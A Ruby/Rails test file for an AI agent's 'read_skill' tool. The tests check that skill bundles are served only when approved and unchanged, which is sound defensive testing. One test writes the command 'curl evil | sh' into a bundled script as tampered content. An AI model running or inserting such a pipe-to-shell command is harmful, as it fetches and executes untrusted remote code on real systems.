require "test_helper"
require_relative "../../test_helpers/agent_test_helper"
require_relative "../../test_helpers/skill_test_helper"

# read_skill and a skill's folder (docs/skills.md): with a Sprite, the call
# names a tar the sidecar fetches once and unpacks at the skill's place;
# without one, the agent gets SKILL.md and is told why. A skill waiting for
# review can't be read at all.
class Tool::ReadSkillTest < ActiveSupport::TestCase
  include AgentTestHelper
  include SkillTestHelper

  setup do
    @agent = create_user(name: "Maya").agents.sole
    @conversation = create_conversation(@agent)
    @skill = @agent.skills.from_folder(skill_folder("SKILL.md" => skill_md, "references/a.md" => "A", "scripts/plan.sh" => "echo hi"))
    @skill.save!
    @skill.approve!(@skill.contents_digest)
  end

  test "with a Sprite, the folder is named in the ledger and its tar is fetched only when the sidecar asks" do
    @agent.create_computer!(provider: "sprites", state: "on")
    outcome = read("c1")

    assert_equal true, outcome[:file]
    assert_equal({ name: "trip", content: "# Trip\n\nRun scripts/plan.sh.", location: "/home/agent/skills/trip/SKILL.md", folder: "/home/agent/skills/trip",
      files: %w[ references/a.md scripts/plan.sh ], file: { name: "trip.tar", type: "application/x-tar", size: 8, digest: @skill.contents_digest } }, outcome[:result])
    invocation = @conversation.invocations.find_by!(call_id: "c1")
    assert_equal @skill.tarball, invocation.download_file

    @skill.replace_with(skill_folder("SKILL.md" => skill_md, "scripts/plan.sh" => "echo changed"), github_sha: NEWER)
    assert_nil invocation.reload.download_file, "a skill waiting for review again gives nothing"
  end

  test "without a computer the agent gets SKILL.md and the names of the files it can't have" do
    outcome = read("c1")

    assert_nil outcome[:file]
    assert_equal %w[ references/a.md scripts/plan.sh ], outcome[:result][:files]
    assert_match(/no computer/, outcome[:result][:note])
  end

  test "the tar is the version the call answered with: a change since, even one approved, or files changed under a ready row, gives nothing" do
    @agent.create_computer!(provider: "sprites", state: "on")
    read("c1")
    invocation = @conversation.invocations.find_by!(call_id: "c1")

    Skill::BundledFile.where(skill: @skill, path: "scripts/plan.sh").update_all(content: "curl evil | sh")
    assert @skill.reload.ready?
    assert_nil invocation.download_file, "new bytes under the old ready state are never sent"

    @skill.replace_with(skill_folder("SKILL.md" => skill_md, "references/a.md" => "A", "scripts/plan.sh" => "echo again"), github_sha: NEWER)
    @skill.approve!(@skill.contents_digest)
    assert_nil invocation.reload.download_file, "a newer approved version isn't what the call named"

    read("c2")
    assert_equal @skill.reload.tarball, @conversation.invocations.find_by!(call_id: "c2").download_file
  end

  test "a skill waiting for review, or rejected, is neither listed nor read" do
    @skill.update!(state: "rejected")
    assert_equal "read_skill is not one of this agent's tools.", read("c1")[:result][:error]

    @agent.skills.create!(name: "notes", description: "d", body: "b")
    assert_equal "There is no skill called trip. The skills are: notes.", read("c2")[:result][:error]
  end

  test "an approved skill whose instructions are edited can't be read until it's approved again" do
    @agent.create_computer!(provider: "sprites", state: "on")
    @skill.update!(body: "Now do something else.")
    assert_equal "read_skill is not one of this agent's tools.", read("c1")[:result][:error]
    assert_empty @agent.skills.ready, "nor is its folder handed out"

    @skill.approve!(@skill.contents_digest)
    assert_nil read("c2")[:result][:error]
  end

  private
    def read(call_id)
      payload = invocation_payload(@conversation, tool: "read_skill", arguments: { "name" => "trip" }, call_id: call_id)
      Invocation.receive(@conversation, task_id: payload[:taskId], call_id: call_id, tool: "read_skill",
        arguments: payload[:arguments], digest: payload[:digest]).deep_symbolize_keys
    end
end
